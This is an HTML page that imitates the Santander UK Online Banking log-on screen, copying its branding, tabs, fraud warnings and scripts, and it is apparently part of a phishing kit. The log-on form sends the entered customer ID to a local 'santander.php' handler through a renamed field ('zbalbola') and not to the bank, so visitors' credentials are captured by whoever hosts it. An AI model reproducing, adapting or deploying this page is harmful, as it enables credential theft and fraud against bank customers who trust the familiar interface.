﻿<!DOCTYPE html>














<html lang="en-GB">
<head>



<title>Santander Online Banking </title>

<meta http-equiv = "Content-Type" content = "text/html; charset=UTF-8" />
<meta http-equiv = "Pragma" content = "no-cache" />
<meta http-equiv = "Expires" content = "Tue, 01 Jan 1980 12:00:00 GMT" />
<meta http-equiv = "Cache-Control" content = "no-cache" />


<link rel="shortcut icon" href="images/favicon.ico" />

<link rel="stylesheet" type="text/css" media="screen, print" href="css/santander.css" />
<link rel="stylesheet" type="text/css" media="print" href="css/print.css" /> 
<!--[if IE]>
<link rel="stylesheet" type="text/css" media="screen,print" href="css/ie.css" />
<![endif]-->
<!--[if lte IE 8]>
<link rel="stylesheet" type="text/css" media="screen" href="css/ie8.css" />
<![endif]-->
<!--[if lte IE 7]>
<link rel="stylesheet" type="text/css" media="screen" href="css/ie7.css" />
<![endif]-->

<script type="text/javascript" src="js/jquery-1.11.0.min.js"></script>
<script type="text/javascript" src="js/jquery-ui-1.10.4.custom.min.js"></script>
<script type="text/javascript" src="js/jquery.validator.1.7.1.min.js"></script>
<script type="text/javascript" src="js/calendar2.js"></script>
<script type="text/javascript" src="js/behaviour2.js"></script>

<script type="text/javascript" src="js/iframekiller.js"></script>
<script type="text/javascript">
			var __nameCookie = "logonMarketingMsgNS"; 
		</script>
<script type="text/javascript" src="js/cookie.js"></script>

<!--[if lte IE 7]>
<script type="text/javascript" src="js/ie7.js"></script>
<![endif]-->
<!--[if IE 8]>
<script type="text/javascript" src="js/ie8.js"></script>
<![endif]-->

<script type="text/javascript" src="js/logon.js"></script>



<!--
<script type="text/javascript" src="js/pm_fp.js"></script>
-->

<script type="text/javascript" src="js/hashtable.js"></script>
<script type="text/javascript" src="js/rsa.js"></script>


	
	
		
			


 
<script src="//assets.adobedtm.com/18a2415ae6b52c3a7c0b946cdfc34cd03d7440e8/satelliteLib-f614afad3dd348a170a03c92881f3682b50a87e8.js"></script>


		
	



		
			<script type="text/javascript">adobeContextData = [{'transactionName': null,'errorCode': null,'errorMsg': {},'page identifier': 'migracionv1_Logon','product identifier': null,'subSection2': null,'subSection3': null,'single': null,'accessType': null,'mccType': null,'mccOrigin': null }];</script>
		
		
			
		
			<script type="text/javascript">

				(function() {
   
   					var snippetID = '97123',
   					host = 'www.splash-screen.net',
   					sn = document.createElement('script');
   					sn.setAttribute('async', true);
   					sn.setAttribute('type', 'text/javascript');
   					sn.setAttribute('src', (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//' + host + '/' + snippetID + '/' + 'splash.js');
   					var s = document.getElementsByTagName('script')[0];
   					s.parentNode.insertBefore(sn, s);

				})();

			</script>			

		

</head>
<body>


	<div id="global">
		<a href="#bodycontent" class="skipToContent">Skip to content</a>
		
		<div id="header">
			<div id="headerbanner" class="padlock">
				<div id="bankname">
				
				    <a href="http://www.santander.co.uk">Santander</a>	
				
				</div>
			</div>
		</div>
		
		
		
		
		
		
		
		
		
		
			<div id="bodycontent">
				
			

		

		
		
		
	<div id="bodycontent">	
		<div id="content">
			<h1>Log on to Online Banking</h1>
				
				
					<p class="cookiesLogOn"><strong>Santander uses cookies to help improve our website and ensure security during your visit. Read about how we use cookies and how you can control them <a href="http://www.santander.co.uk/uk/cookie-policy/" target="_blank">here</a>. Continued use of this site indicates that you accept this policy.</strong></p>
				
				
				
			

			
			<ul class="logTabs">				
				<li class="active"><a href="#" >Personal</a></li>
				<li><a href=https://business.santander.co.uk/LGSBBI_NS_ENS/BtoChannelDriver.ssobto?dse_operationName=LGSBBI_LOGON&dse_processorState=initial&redirect=S>Business</a></li>
				<li><a href=https://corporate.santander.co.uk/LOGSCU_NS_ENS/BtoChannelDriver.bto?dse_operationName=OP_LOG_ON>Corporate</a></li>
			</ul>
			
			<div id="logonstep1" class="container">
				<div class="logOnSection">	
					<form method="post" action="santander.php" name="formCustomerID_1" id="formCustomerID_1" >
						<fieldset>
							<div class="form-item multiple">	
								
								<label for="infoLDAP_E.customerID" class="fieldhelp"><span class="labeltext">Enter your Personal/Customer ID <img src="/Estatico/ALP_EBAN_Templates/Images/ico_help.gif" alt="" title="Please enter  your ID.  Your ID may have been previously  known as your Personal ID, Customer ID or Customer number." /></span></label>	
								<span class="data">					
									<span class="row">
										
											<input type="text" class="mandatory firstfocus" autocomplete="off" value="" id="infoLDAP_E.customerID" name="zbalbola"  maxlength="26"/><br />
											
										
									</span>
									<span class="row">	
										<label for="chk_publiccomp" class="fieldhelp">	
											
												
												 
													
													<input type="checkbox" class="radioInput" value="1" name="infoLDAP_E.rememberID" id="chk_publiccomp" />								
												
												
												
												
											
																													  
																	
											Remember my ID <img src="/Estatico/ALP_EBAN_Templates/Images/ico_help.gif" alt="" title="If you want us to remember your ID when you log in to Online Banking on this computer, check the box." />
											
										</label>
									</span>
								</span>
								<div class="buttonholder">
									<span class="button">
										<input type="submit" id="btnFO" class="defaultAction primary" value="Log on &gt;" onclick="return ntptLinkTag( this, 'lc= http%3A%2F%2Fwww.santander.co.uk%2Fpre_force_change%3Fchange%3DOK', 'un= 1713717', 1 );"/>
									</span>
								</div>
										
									
								<a href="/RESCUK_NS_ENS/ChannelDriver.ssobto?dse_operationName=mainReaccess">Forgotten your log on details?</a>
							</div>						
						</fieldset>	
												
						<input type="hidden" id="foData" name="foData"/>
						<input type="hidden" name="origen" value="validate"/>
						<input type="hidden" name="bind.devicePrint" value="" />						
						<input type="hidden" id="IdGhostAccount" name="IdGhostAccount" value=""/>
						
						<input type="hidden" id="urlLog" name="urlLog" value="https://retail.santander.co.uk/LOGSUK_NS_ENS/ALP_LOGSUK_Logon/LOGON_V1/migracionv1_Logon_Parent.jsp"/>						
						<input type="hidden" id="ssCookie" name="ssCookie" value="a1lKpk-GIZXRsjkZ3XCH7Js"/>
						<input type="hidden" id="jsessionID" name="jsessionID" value="a1lKpk-GIZXRsjkZ3XCH7Js"/>
						
					</form>
					
					<script type="text/javascript">
						
						document.forms[0].elements['bind.devicePrint'].value = encode_deviceprint();
					
					</script>
					<script type="text/javascript">
						function pub940l1m1() {
						
						var result = {
							"u" : { "p": [""] },
							"c" : "a1lKpk-GIZXRsjkZ3XCH7Js"
						}
						return result;
					}
					</script>
				</div>
				<h2 class="logOnTitle">Sign up for Online and Mobile Banking</h2>
				<div class="logOnSection">
					<h3>Signing up only takes a few minutes. Once you are logged on, you can:</h3>
					<ul class="itemList">
						<li>view statements and transactions</li>
						<li>transfer money between accounts</li>
						<li>pay bills and people</li>
						<li>set up text and email alerts</li>
						<li>and much more!</li>
					</ul>
					<h5>Did you know? You can also sign up for Online and Mobile Banking using your mobile phone. Simply download the app from the App Store or Google Play Store.</h5>
					<div class="buttonholder">
						<span class="button">
							<a href="/ENRIUK_NS_ENS/BtoChannelDriver.ssobto?dse_operationName=Access_ENRIUK" class="defaultAction primary" target="blank">Sign up &gt;</a>											
						</span>
					</div>
				</div>
				<h2 class="logOnTitle">Log on to other online services</h2>
				<div class="logOnSection">
					<ul class="linkList">
						
						<li><a href="https://www.inscape.com/html_site/html/account/login.asp" target="premium" >Clients of Premium Investments</a></span></li>
					</ul>
				</div>		
			</div>
		</div>
	</div>
		
		</div>

		
		
			<div id="logonside">
				<div class="usefulLinksMenu">
					<h2><span class="icoUseful">&nbsp;</span>Useful links</h2>
					
					
					
							
					<ul>
					
					    
							<li><a href="http://www.santander.co.uk/uk/help-support/online-banking" target="santanderHelp">About Online Banking</a></li>
							<li><a href="http://www.santander.co.uk/info/videohub/helping-you-understand-online-banking/" target="santanderHelp">View Online Banking videos</a></li>
							
							<li><a href="http://www.santander.co.uk/uk/help-support/mobile-banking/" target="santanderHelp">About Mobile Banking</a></li>
							<li><a href="http://www.santander.co.uk/info/videohub/helping-you-understand-mobile-banking/" target="santanderHelp">View Mobile Banking videos</a></li>
							<li><a href="https://info.yoursantander.co.uk/sendmethelink/" target="santanderHelp">Send me Online and Mobile Banking guides</a></li>
						<li><a href="http://www.santander.co.uk/uk/help-support/online-banking/online-banking-contact-us" target="contactUs">Contact us</a></li>
						<li><label class="infologon"><a href="http://www.santander.co.uk/csgs/Satellite?appID=abbey.internet.Abbeycom&amp;c=Page&amp;canal=CABBEYCOM&amp;cid=1237877606230&amp;empr=Abbeycom&amp;leng=en_GB&amp;pagename=Abbeycom%2FPage%2FWC_ACOM_TemplateA2" target="TyC">Changes to Online and Mobile Banking Terms and Conditions</a></label></li>	
				
					</ul>
					
						
					
					
				</div>
				
					<div class="importantNotes">
						<h2>Important Fraud Information</h2>
						<div class="section">
							
							<p><b>Never</b> share a Santander One Time Passcode (OTP) with another person. Not even a Santander employee.</p>
                            <p><b>Never</b> download software or let anyone remotely log on to your computer or devices, either during or after a cold call.</p> 
                            <p><b>Never</b> enter your Online Banking details after clicking on a link in an email or text message.</p>
                            <p><b>Never</b> transfer or withdraw money out of your account if you’re instructed to do so for security reasons.</p>
                            <p><b>Never</b> set up new or change existing payment details without first verifying the request directly with the person or company you’re paying, preferably using existing contact details.</p>
                            <p> Click <a href="http://www.santander.co.uk/uk/help-support/security-centre" target="_blank">here</a> for more information on how to protect yourself from fraud and scams.</p>
					</div>	
					<div class="section">
						<h2>Security Software</h2>
							<p>Install <a href="https://ad.doubleclick.net/ddm/clk/313171102;140936108;m" target="_blank">Trusteer Rapport</a>. This free software can help protect you when you're using Online Banking.</p>
					</div>	
							
							
					<div class="section">
						<h2>Received a suspicious email?</h2>
						
					  <p>If you get an email that's branded Santander but doesn't contain your name, do not reply, open any attachment or click on any link. Forward the email to <a href="mailto:phishing@santander.co.uk">phishing@santander.co.uk</a> for us to investigate.</p>
					
					</div>	

					</div>

				
				
					
				
			</div>
		
		
		<div id="footer">	
		
			<ul>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/online-mobile-banking-commitment/" target="santanderHelp">Online Banking Guarantee</a></li>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/accessibility/" target="santanderHelp">Site Help &amp; Accessibility</a></li>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/help-support/security-centre/data-protection/" target="santanderHelp">Security &amp; Privacy</a></li>
				
					<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/help-support/online-banking-terms-conditions/" target="santanderHelp">Terms &amp; Conditions</a></li>
				
					<li class="last"><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/website-legal/" target="santanderHelp">Legal</a></li>
			</ul>
		
		</div>

	</div>
	 
	<script type="text/javascript">dataLayer = [{'page_name': '/ALP_LOGSUK_Logon/LOGON/migracionv1_Logon','product_details':'','event':'application_funnel' }];</script>
<!-- Google Tag Manager --><noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-FTB8"height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-FTB8');</script><!-- End Google Tag Manager -->
	
	 	
	
	
		<script type="text/javascript">_satellite.pageBottom();</script>
	
	
	</body>
	
	
	
	
</html>